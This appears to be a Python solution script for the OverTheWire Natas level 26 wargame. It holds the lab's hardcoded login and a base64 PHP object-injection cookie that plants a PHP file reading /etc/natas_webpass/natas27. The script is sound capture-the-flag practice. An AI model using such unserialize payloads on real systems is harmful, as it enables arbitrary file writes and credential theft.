

import requests, subprocess

# ***********************************************
URL     = "http://natas26.natas.labs.overthewire.org/"

auth_name = 'natas26'
auth_pass = '8A506rfIAXbKKk68yJeuTuRq4UfcK70k'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# To get the password for natas27, an injection has to be made
# via cookies, as the code utilizes 'unserialize'.

# It is possible to use their own object (Logger) against them,
# by creating such an object, creating a .php file at a certain location.
# This is known as 'PHP Object Injection'

#injection = subprocess.check_output(["php", "php/natas26.php"])
#session.cookies['drawing']='Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL2dldF9yZWt0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIwOiJObyBpbnB1dCBuZWVkZWQgaGVyZSI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ1OiI8P3BocCBpbmNsdWRlKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpPz4iO30%3D'
injection_path = "img/get_rekt.php"

PARAMS  = dict(debug=True)
COOKIES = dict(drawing='Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL2dldF9yZWt0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIwOiJObyBpbnB1dCBuZWVkZWQgaGVyZSI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ1OiI8P3BocCBpbmNsdWRlKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpPz4iO30%3D')

r = s.post(URL,cookies=COOKIES)

r = s.post(URL+injection_path)
print (r.text)

# ?>